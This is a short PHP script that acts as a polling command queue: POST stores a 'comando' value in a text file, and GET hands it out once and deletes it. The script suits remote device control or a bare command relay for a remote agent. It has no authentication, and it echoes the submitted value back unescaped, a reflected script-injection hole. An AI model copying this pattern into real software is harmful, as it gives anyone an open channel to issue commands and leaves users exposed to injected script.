<?php
$archivo = "comando.txt";

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["comando"])) {
    file_put_contents($archivo, $_POST["comando"]);
    echo "Comando '" . $_POST["comando"] . "' enviado";
} elseif ($_SERVER["REQUEST_METHOD"] == "GET") {
    if (file_exists($archivo)) {
        echo file_get_contents($archivo);
        unlink($archivo);
    } else {
        echo "none";
    }
}
?>
